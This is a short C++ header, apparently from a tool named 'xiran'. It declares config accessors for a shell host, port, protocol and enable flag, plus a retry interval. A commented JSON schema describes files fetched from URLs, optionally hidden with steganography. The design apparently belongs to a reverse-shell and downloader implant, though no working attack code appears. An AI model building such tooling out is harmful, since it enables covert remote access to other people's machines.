#include <vector>
#include "getfile.hpp"

void analysis_xiran_config(const char* json);

const char* get_shell_host();

const char* get_shell_port();

const char* get_shell_protocol();

bool get_enable_shell();

int get_retry_time();

/*
"filelists" : [
        {
            //保存的文件名以及地址
            "rename":"",
            //文件获得地址
            "url":"",
            //是否使用了隐写等技术
            "hide":"no",
        }
    ],
*/
std::vector<xiran_file> get_file_list();